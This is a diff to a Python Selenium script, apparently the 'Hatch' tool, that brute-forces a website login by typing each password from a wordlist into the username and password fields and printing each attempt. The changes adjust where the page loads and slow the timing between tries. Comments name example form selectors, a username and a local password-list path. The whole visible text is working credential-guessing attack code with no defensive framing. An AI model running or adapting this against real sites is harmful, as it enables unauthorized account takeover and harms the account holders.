@@ -80,15 +80,16 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
     browser = webdriver.Chrome(options=optionss)  # Changed to pass options
     while True:
         try:
+            browser.get(website)
             for line in f:
-                browser.get(website)
-                t.sleep(0.1)
+                #browser.get(website)
+                t.sleep(2)
                 Sel_user = browser.find_element(By.CSS_SELECTOR,username_selector)
                 Sel_pas = browser.find_element(By.CSS_SELECTOR,password_selector)
                 enter = browser.find_element(By.CSS_SELECTOR,login_btn_selector)
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
-                t.sleep(0.1)
+                t.sleep(5)
                 print('------------------------')
                 print(color.GREEN + 'Tried password: ' + color.RED + line + color.GREEN + 'for user: ' + color.RED + username)
                 print('------------------------')
@@ -133,5 +134,5 @@ brutes(username, username_selector, password_selector, login_btn_selector, pass_
 #UserField: #name
 #PassField:#password
 #Login Button: #_submit
-#Username: admin Dummy halflife
+#Username: Dummy dragon
 #D:\Python Tools\Hatch-master\Hatch-master\passlist.txt
